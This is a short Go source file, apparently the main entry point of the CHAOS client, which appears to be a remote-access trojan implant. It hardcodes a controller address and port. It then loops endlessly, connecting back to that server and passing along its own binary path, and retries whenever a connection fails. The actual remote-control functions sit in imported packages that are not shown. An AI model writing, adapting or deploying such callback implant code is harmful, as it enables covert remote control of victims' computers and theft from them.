package main

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"os"
	"time"
)

var (
	ServerAddress = "192.168.15.6"
	ServerPort    = "8081"
)

func main() {
	binaryPath := os.Args[0]
	for {
		log.WithFields(log.Fields{
			"address": ServerAddress,
			"port":    ServerPort,
		}).Info("starting new connection with server")

		newApp, err := app.NewApp(ServerAddress, ServerPort, binaryPath)
		if err != nil {
			log.WithField("cause", err.Error()).Error("error starting app")
			time.Sleep(util.TimeSleep)
			continue
		}

		if err := newApp.Run(); err != nil {
			log.WithField("cause", err.Error()).Error("error running app")
			time.Sleep(util.TimeSleep)
		}
	}
}
